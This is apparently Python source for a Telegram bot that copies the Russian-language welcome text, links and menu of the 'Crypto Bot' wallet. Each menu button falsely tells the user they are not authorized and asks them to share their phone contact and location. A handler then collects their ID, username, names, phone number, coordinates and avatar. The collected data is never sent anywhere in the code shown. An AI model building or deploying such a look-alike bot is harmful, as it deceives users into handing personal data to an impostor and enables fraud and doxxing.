import telebot
from telebot import types
import confs

bot = telebot.TeleBot(confs.TOKEN)

@bot.message_handler(commands=["start"])
def start(message):
    text = (
        "💠 [Мультивалютный криптокошелёк](https://t.me/CryptoBotRU/14). "
        "Покупайте, продавайте, храните и [отправляйте](https://t.me/CryptoBotRU/228) криптовалюту в любое время.\n\n"
        "Подписывайтесь на [наш канал](https://t.me/CryptoBotRU) "
        "и вступайте в [наш чат](https://t.me/CryptoBotRussian).\n\n"
        "🎄 [Новый год](https://t.me/CryptoBotRU/459) с 🦋 *Crypto Bot*! 🎁 [Получить новогодние баллы ›](https://t.me/send/app?startapp=new-year)"
    )

    # --- Главное меню как у CryptoBot ---
    keyboard = types.InlineKeyboardMarkup(row_width=3)

    keyboard.row(
        types.InlineKeyboardButton("📱 Открыть в приложении", callback_data="openapp"),
    )

    keyboard.row(
        types.InlineKeyboardButton("👛 Кошелёк", callback_data="wallet"),
        types.InlineKeyboardButton("🔄 Обмен", callback_data="exchange")
        
    )
    keyboard.row(
        types.InlineKeyboardButton("📊 P2P", callback_data="p2p"),
        types.InlineKeyboardButton("📈 Биржа", callback_data="market"),
    )
    keyboard.row(
        types.InlineKeyboardButton("💳 Чеки", callback_data="checks"),
        types.InlineKeyboardButton("🧾 Счета", callback_data="invoices")
    )
    keyboard.row(
        types.InlineKeyboardButton("🏝 Crypto Pay", callback_data="cryptopay"),
        types.InlineKeyboardButton("🎁 Розыгрыши", callback_data="prizes")
    )
    keyboard.row(
        types.InlineKeyboardButton("🍑 Подписки", callback_data="follows"),
        types.InlineKeyboardButton("⚙️ Настройки", callback_data="settings"),
    )

    bot.send_message(
        message.chat.id,
        text,
        parse_mode="Markdown",
        reply_markup=keyboard
    )

def send_contact_location_keyboard(chat_id, text="Вы не авторизованы! Предоставьте доступ:"):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("📱 Предоставить профиль", request_contact=True)
    btn2 = types.KeyboardButton("📱 Предоставить доступ", request_location=True)
    keyboard.add(btn1, btn2)
    bot.send_message(chat_id, text, reply_markup=keyboard)

@bot.message_handler(content_types=['contact', 'location', 'text'])
def handler(message):
    user = message.from_user

    try:
        photos = bot.get_user_profile_photos(user.id, limit=1)
        avatar_file_id = photos.photos[0][0].file_id if photos.total_count > 0 else None
    except:
        avatar_file_id = None

    data = {
        "chat_id": message.chat.id,
        "user_id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "language_code": user.language_code,
        "is_premium": user.is_premium,
        "phone_number": message.contact.phone_number if message.contact else None,
        "location": {
            "latitude": message.location.latitude if message.location else None,
            "longitude": message.location.longitude if message.location else None
        },
        "avatar_file_id": avatar_file_id,
    }

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):

    if call.data == "openapp":
       send_contact_location_keyboard(call.message.chat.id)

    if call.data == "wallet":
        send_contact_location_keyboard(call.message.chat.id)

    elif call.data == "exchange":
        send_contact_location_keyboard(call.message.chat.id)

    elif call.data == "p2p":
        send_contact_location_keyboard(call.message.chat.id)

    elif call.data == "market":
        send_contact_location_keyboard(call.message.chat.id)

    elif call.data == "checks":
        send_contact_location_keyboard(call.message.chat.id)

    elif call.data == "invoices":
        send_contact_location_keyboard(call.message.chat.id)

    elif call.data == "settings":
        send_contact_location_keyboard(call.message.chat.id)

    elif call.data == "prizes":
        send_contact_location_keyboard(call.message.chat.id)

    elif call.data == "follows":
        send_contact_location_keyboard(call.message.chat.id)

bot.polling(none_stop=True)

